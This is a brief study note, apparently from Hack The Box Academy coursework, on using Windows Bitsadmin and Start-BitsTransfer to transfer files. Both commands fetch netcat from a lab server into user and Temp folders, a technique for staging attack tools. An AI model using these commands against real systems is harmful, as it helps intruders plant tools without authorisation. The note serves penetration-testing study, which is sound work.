Using Bitsadmin to send and receive files
###########################################

Date: 2024-11-04 10:57

Status:


Description
*************

Bitsadmin is common on Window computer and can be used like Netcat to
send/receive files

Step 1: make the file available to download

.. code-block:: console

   PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

Step 2: Download

.. code-block:: console

   PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

References
*************
https://academy.hackthebox.com/module/24/section/1575
